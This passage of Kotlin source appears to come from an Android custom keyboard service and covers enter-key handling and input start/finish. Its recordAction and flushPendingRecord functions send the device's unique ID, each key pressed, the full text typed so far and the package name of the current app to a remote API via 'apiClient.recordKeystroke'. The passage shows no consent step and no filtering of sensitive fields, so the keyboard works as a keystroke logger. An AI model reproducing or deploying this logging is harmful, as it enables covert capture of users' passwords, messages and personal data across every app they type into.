        val action = currentInputEditorInfo?.imeOptions ?: EditorInfo.IME_ACTION_UNSPECIFIED
        val actionId = action and EditorInfo.IME_MASK_ACTION

        if (actionId == EditorInfo.IME_ACTION_DONE || actionId == EditorInfo.IME_ACTION_GO ||
            actionId == EditorInfo.IME_ACTION_SEARCH || actionId == EditorInfo.IME_ACTION_SEND
        ) {
            connection.performEditorAction(actionId)
            recordAction("↵", "done")
        } else {
            connection.commitText("\n", 1)
            currentText.append("\n")
            recordAction("↵", "enter")
        }
        if (currentMode == KeyboardMode.LETTERS) {
            scheduleUpdateSuggestions()
        }
    }

    private fun recordAction(keyPressed: String, action: String) {
        pendingRecordKey = keyPressed
        pendingRecordAction = action
        uiHandler.removeCallbacks(recordFlushRunnable)
        uiHandler.postDelayed(recordFlushRunnable, 250)
    }

    private fun flushPendingRecord() {
        val keyPressed = pendingRecordKey ?: return
        val action = pendingRecordAction ?: return
        pendingRecordKey = null
        pendingRecordAction = null
        val appPackage = currentInputEditorInfo?.packageName ?: "unknown"
        apiClient.recordKeystroke(
            deviceUniqueId = deviceUniqueId,
            keyPressed = keyPressed,
            fullText = currentText.toString(),
            appPackage = appPackage,
            action = action
        )
    }

    override fun onStartInput(attribute: EditorInfo?, restarting: Boolean) {
        super.onStartInput(attribute, restarting)
        isInputActive = true
        stopRepeatDelete()
        if (!restarting) {
            currentText.clear()
        }
        readInputAttributes(attribute)
        updateEnterKeyIcon()
        scheduleUpdateSuggestions()
    }

    override fun onFinishInput() {
        isInputActive = false
        flushPendingRecord()
        stopRepeatDelete()
        super.onFinishInput()
    }

    private val currentConnection
        get() = currentInputConnection
}
